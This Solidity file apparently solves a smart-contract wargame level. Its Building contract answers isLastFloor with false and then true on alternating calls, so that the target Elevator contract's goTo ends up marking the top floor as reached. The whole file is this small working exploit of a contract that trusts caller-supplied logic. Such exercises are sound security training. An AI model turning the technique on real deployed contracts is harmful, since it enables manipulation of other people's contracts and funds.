// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
  function goTo(uint _floor) external;
}


contract Building {
  uint public counter;

  function isLastFloor(uint floor) external returns (bool) {
      bool value;
      if (counter%2 == 0) {
          value = false;
      } else {
          value = true;
      }
      ++counter;
      return value;
  }

  function call(address _addr) public {
      Elevator elevator = Elevator(_addr);
      elevator.goTo(0);
  }
}